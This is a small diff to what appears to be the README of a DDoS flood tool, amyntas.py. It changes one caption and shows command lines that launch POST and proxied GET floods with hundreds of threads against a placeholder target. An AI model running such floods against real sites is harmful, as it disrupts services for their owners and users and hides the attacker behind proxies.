@@ -81,7 +81,7 @@ POST flood, attacking with 700 threads for 40 seconds:
 python3 amyntas.py -t https://target.com -w 700 -m POST -d 40
 ```
 
-Proxified HEAD flood using a file with SOCKS5 proxies, with 1337 threads for 40 seconds
+Proxified GET flood using a file with SOCKS5 proxies, with 1337 threads for 40 seconds
 ```
 python3 amyntas.py --proxy-file socks5.txt --proxy-type SOCKS5 -t https://target.com -w 1337 -d 40
 ```
